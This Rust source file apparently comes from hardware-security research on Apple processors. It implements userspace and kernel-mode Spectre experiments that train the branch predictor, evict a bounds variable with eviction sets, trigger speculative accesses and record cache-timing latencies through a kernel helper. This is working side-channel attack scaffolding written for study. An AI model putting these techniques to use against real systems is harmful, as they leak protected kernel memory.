/*!
 * Spectre testing.
 */
use crate::*;
use core::arch::asm;

/// Target for userspace spectre data testing
pub unsafe fn data_spectre_target(load_maybe: *const u8, do_it: bool) {
    if do_it {
        core::ptr::read_volatile(load_maybe);
        asm!{
            "ldr {tmp}, [{ptr}]",
            tmp = lateout(reg) _,
            ptr = in(reg) load_maybe as u64,
        }
    }
}

/// Userspace spectre data attack
pub unsafe fn data_spectre(memory_region: &mut [u8]) {
    let test_ptr = &memory_region[0] as *const u8;
    let spectre_ptr = &memory_region[4096] as *const u8;
    let spectre_addr = spectre_ptr as u64;

    core::ptr::read_volatile(test_ptr);
    core::ptr::read_volatile(spectre_ptr);
    init_memory(memory_region);

    for i in 0..128 {
        data_spectre_target(test_ptr, true);
    }

    data_spectre_target(spectre_ptr, false);
    println!("Time to access is {} cycles", timer::time_access(spectre_addr));
}

/// Kernel mode spectre testing
pub const NUM_DATA_SPECTRE_KERNEL_TRIALS : usize = 512;
pub unsafe fn data_spectre_kernel(memory_region: &mut [u8]) {
    let handle = PacmanKitConnection::init().unwrap();
    let kernel_region = handle.kernel_mmap().unwrap();

    let train_ptr = kernel_region;
    let spectre_ptr = kernel_region + 0x100C80;
    let unrelated_ptr = kernel_region + 0x201DA0;

    println!("Training on 0x{:X}", train_ptr);
    println!("Spectre on 0x{:X}", spectre_ptr);
    let limit_va = handle.leak_limit_location().unwrap();
    let limit_pa = handle.kernel_virt_to_phys(limit_va).unwrap();
    println!("LIMIT is at 0x{:X} (PA 0x{:X})", limit_va, limit_pa);
    println!("LIMIT contains 0x{:X}", handle.kernel_read(limit_va).unwrap());

    let limit_evset = evset::data_pevset(limit_va, limit_pa, memory_region);
    let mut limit_evset_chosen : Vec<u64> = limit_evset.choose_multiple(&mut rand::thread_rng(), 50).into_iter().cloned().collect();
    let mut limit_indexes : Vec<usize> = (0..limit_evset_chosen.len()).collect();
    limit_indexes.shuffle(&mut thread_rng());

    let mut times = [0u64; NUM_DATA_SPECTRE_KERNEL_TRIALS];

    for cur_iter_idx in 0..NUM_DATA_SPECTRE_KERNEL_TRIALS {
        // 0. Get everything setup to a good known initial condition
        handle.kernel_read(train_ptr).unwrap();
        handle.kernel_read(spectre_ptr).unwrap();
        handle.kernel_read(unrelated_ptr).unwrap();
        init_memory(memory_region);

        // 1. Train branch predictor
        for i in 0..64 {
            handle.kernel_read_for_spectre(train_ptr, 0x00).unwrap();
        }

        // 2. Evict LIMIT variable
        for i in 0..limit_indexes.len() {
            timer::time_access(limit_evset_chosen[limit_indexes[i]]);
        }
        // init_memory(memory_region);
        flush_cache(memory_region);

        // 3. Perform speculative access
        // handle.kernel_read_for_spectre(spectre_ptr, 0x50).unwrap();

        // 4. Record results with kernel timing oracle
        let latency = handle.kernel_read_for_timing(spectre_ptr, true).unwrap();
        times[cur_iter_idx] = latency;
        // let latency_limit = handle.kernel_read_for_timing(limit_va, true).unwrap();
        // times[cur_iter_idx] = (latency, latency_limit);
    }

    // Make sure to do all printing *AFTER* the tests have completed!
    // println!("Reload latency is {} cycles", latency);
    print!("[");
    for idx in 0..NUM_DATA_SPECTRE_KERNEL_TRIALS {
        print!("{},", times[idx]);
    }
    println!("]");
}

/// Kernel mode spectre testing
pub const NUM_INST_SPECTRE_KERNEL_TRIALS : usize = 512;
pub unsafe fn inst_spectre_kernel(memory_region: &mut [u8]) {
    let handle = PacmanKitConnection::init().unwrap();
    let kernel_region = handle.kernel_mmap().unwrap();

    // @TODO: make this another address in the retpoline region:
    let train_ptr = handle.leak_win().unwrap() | PAC_BITMASK;
    // let spectre_ptr = handle.leak_method().unwrap() | PAC_BITMASK;
    let spectre_ptr = handle.leak_retpoline().unwrap() | PAC_BITMASK;

    println!("Training on 0x{:X}", train_ptr);
    println!("Spectre on 0x{:X}", spectre_ptr);
    let limit_va = handle.leak_limit_location().unwrap();
    let limit_pa = handle.kernel_virt_to_phys(limit_va).unwrap();
    println!("LIMIT is at 0x{:X} (PA 0x{:X})", limit_va, limit_pa);
    println!("LIMIT contains 0x{:X}", handle.kernel_read(limit_va).unwrap());

    let limit_evset = evset::data_pevset(limit_va, limit_pa, memory_region);
    let mut limit_evset_chosen : Vec<u64> = limit_evset.choose_multiple(&mut rand::thread_rng(), 50).into_iter().cloned().collect();
    let mut limit_indexes : Vec<usize> = (0..limit_evset_chosen.len()).collect();
    limit_indexes.shuffle(&mut thread_rng());

    let mut times = [0u64; NUM_INST_SPECTRE_KERNEL_TRIALS];

    // Use a giant retpoline to flush the L1 iCache
    let mut retpoline_l1i_as_ptr : *mut u8 = 0 as *mut u8;
    let kret = mach::mach_vm_allocate(
        mach::mach_task_self(),
        &mut retpoline_l1i_as_ptr,
        cache::L2_SIZE,
        VM_FLAGS_ANYWHERE
    );

    let err_str = CStr::from_ptr(mach_error_string(kret));
    if KERN_SUCCESS != kret {
        println!("Error creating L1 iCache retpoline memory region! ({}). Error is {:?}", kret, err_str);
        return;
    }

    let retpoline_l1i = (retpoline_l1i_as_ptr as u64) & (!PAC_BITMASK);

    retpoline::mk_retpoline_addr(retpoline_l1i as u64, cache::L2_SIZE);

    for cur_iter_idx in 0..NUM_INST_SPECTRE_KERNEL_TRIALS {
        // 0. Get everything setup to a good known initial condition
        handle.kernel_exec_for_timing(train_ptr, true).unwrap();
        handle.kernel_exec_for_timing(spectre_ptr, true).unwrap();
        init_memory(memory_region);
        flush_cache(memory_region);
        flush_iCache(retpoline_l1i);

        // 1. Train branch predictor
        for i in 0..64 {
            handle.kernel_exec_for_spectre(train_ptr, 0x00).unwrap();
        }

        // 2. Evict LIMIT variable
        for i in 0..limit_indexes.len() {
            timer::time_access(limit_evset_chosen[limit_indexes[i]]);
        }
        // init_memory(memory_region);
        // flush_cache(memory_region);

        // 3. Perform speculative access
        // Commenting this out should result in DRAM latencies only:
        handle.kernel_exec_for_spectre(spectre_ptr, 0x50).unwrap();

        // 4. Record results with kernel timing oracle
        let latency = handle.kernel_exec_for_timing(spectre_ptr, true).unwrap();
        times[cur_iter_idx] = latency;
        // let latency_limit = handle.kernel_read_for_timing(limit_va, true).unwrap();
        // times[cur_iter_idx] = (latency, latency_limit);
    }

    // Make sure to do all printing *AFTER* the tests have completed!
    // println!("Reload latency is {} cycles", latency);
    print!("[");
    for idx in 0..NUM_INST_SPECTRE_KERNEL_TRIALS {
        print!("{},", times[idx]);
    }
    println!("]");
}
